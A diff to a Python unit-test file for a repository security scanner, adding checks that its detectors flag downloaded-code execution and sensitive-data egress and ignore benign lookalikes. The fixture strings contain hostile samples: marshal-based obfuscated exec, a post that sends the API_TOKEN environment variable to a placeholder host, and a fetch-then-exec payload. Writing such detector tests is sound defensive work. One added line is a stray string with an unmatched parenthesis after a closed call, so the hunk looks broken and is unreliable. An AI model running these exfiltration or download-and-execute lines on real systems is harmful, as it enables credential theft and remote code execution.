@@ -393,12 +393,16 @@ class OneHealthScannerTests(unittest.TestCase):
     def test_security_ast_correlates_obfuscated_execution_and_data_egress(self):
         self.write("obfuscated.py", "import marshal\npayload = get_payload()\nexec(marshal.loads(payload))\n")
         self.write("exfil.py", "import os\nimport requests\nrequests.post('https://example.invalid/collect', json={'token': os.environ['API_TOKEN']})\n")
+        self.write("download_exec.py", "import requests\nresponse = requests.get('https://example.invalid/payload')\nexec(response.text)\n")
         self.write("benign.py", "import base64\nimport requests\npayload = base64.b64decode('aGVsbG8=')\nrequests.post('https://example.invalid/collect', data='hello')\n")
+                   "requests.post('https://example.invalid/collect', json={'token': 'hello'})\n")
         report = scan_repository(self.root)
         findings = [f for f in report["findings"] if f["detector_id"] == "security-code"]
         rules = {f["rule_id"] for f in findings}
         self.assertIn("obfuscated-execution", rules)
         self.assertIn("sensitive-data-egress", rules)
+        self.assertTrue(any(f["path"] == "download_exec.py" and f["rule_id"] == "downloaded-code-execution"
+                            for f in findings))
         egress = next(f for f in findings if f["rule_id"] == "sensitive-data-egress")
         self.assertNotIn("API_TOKEN", json.dumps(egress))
         self.assertNotIn("example.invalid/collect", json.dumps(egress))
@@ -414,6 +418,7 @@ class OneHealthScannerTests(unittest.TestCase):
                    "import requests\nimport subprocess\n"
                    "response = requests.get('https://example.invalid/status')\n"
                    "subprocess.run(['echo', 'safe'], check=True)\n")
+        self.write("benign_token_field.py", "import requests\nrequests.post('https://example.invalid/collect', json={'token': 'hello'})\n")
         report = scan_repository(self.root)
         self.assertFalse(any(
             f["path"] == "unrelated.py" and f["rule_id"] == "sensitive-data-egress"
@@ -421,6 +426,10 @@ class OneHealthScannerTests(unittest.TestCase):
         ))
         self.assertFalse(any(
             f["path"] == "unrelated_fetch.py" and f["rule_id"] == "downloaded-code-execution"
+            for f in report["findings"]
+        ))
+        self.assertFalse(any(
+            f["path"] == "benign_token_field.py" and f["rule_id"] == "sensitive-data-egress"
             for f in report["findings"]
         ))
 
